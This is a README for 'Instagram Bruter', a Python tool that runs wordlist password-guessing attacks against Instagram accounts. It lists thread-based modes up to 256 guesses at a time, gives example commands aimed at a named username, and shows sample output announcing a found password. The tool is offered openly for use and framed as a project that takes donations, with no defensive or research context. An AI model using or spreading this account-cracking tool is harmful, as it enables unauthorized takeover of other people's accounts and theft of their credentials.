# Instagram Bruter

[![Version](https://img.shields.io/badge/Version-v2.1.0-blue.svg)]()
[![Python](https://img.shields.io/badge/Python-v2.7--3-blue.svg)]()
[![Discord](https://img.shields.io/badge/Chat-Server-brightgreen.svg)](https://discord.gg/SMUaWmn)
<br>

### Support
It's not easy maintaining this code, a donation of any size would be helpful<br>
[![Donate](https://img.shields.io/badge/Paypal-Donate-orange.svg)]( https://www.paypal.me/Msheikh03)

__Usage:__ ```python instagram.py <username> <wordlist> -m <mode>```

### Requirements
- Python *v2.x* **|** *v3.x*
- ~~Kali Linux 2.0~~
- ~~TOR~~

### Install Dependencies
```
python install.py
```

### Help
```
C:\Users\Mohamed\Desktop\Instagram>python instagram.py -h
usage: instagram.py [-h] [-m MODE] username wordlist

positional arguments:
  username              email or username
  wordlist              password list

optional arguments:
  -h, --help            show this help message and exit
  -m MODE, --mode MODE  modes: 0 => 16 bots; 1 => 8 bots; 2 => 4 bots; 3 => 2 bots
```

### Bots(Threads)
- 2 bots: 32 passwords at a time
- 4 bots: 64 passwords at a time
- 8 bots: 128 passwords at a time
- 16 bots: 256 passwords at a time

### Modes
- 0: 16 bots
- 1: 8 bots
- 2: 4 bots
- 3: 2 bots

### Chill mode
This mode uses only 2 bots, or 32 passwords at a time.
```
C:\Users\Mohamed\Desktop\Instagram>python instagram.py Sami09.1 pass.lst -m 3
```

### Moderate mode 1
This mode uses 4 bots, or 64 passwords at a time.
```
C:\Users\Mohamed\Desktop\Instagram>python instagram.py Sami09.1 pass.lst -m 2
```

### Moderate mode 2
This mode uses 8 bots, or 128 passwords at a time.
```
C:\Users\Mohamed\Desktop\Instagram>python instagram.py Sami09.1 pass.lst -m 1
```

### Savage mode
This mode uses 16 bots, or 256 passwords at a time.
```
C:\Users\Mohamed\Desktop\Instagram>python instagram.py Sami09.1 pass.lst -m 0
```

### If you don't specify a mode, then mode is set to 2

### Run
```
[-] Wordlist: pass.lst
[-] Username: Sami09.1
[-] Password: 2
[-] Attempts: 14
[-] Browsers: 87
```

### Stop
```
[-] Wordlist: pass.lst
[-] Username: Sami09.1
[-] Password: Sami123
[-] Attempts: 101
[-] Browsers: 0

[!] Password Found
[+] Username: Sami09.1
[+] Password: Sami123
```
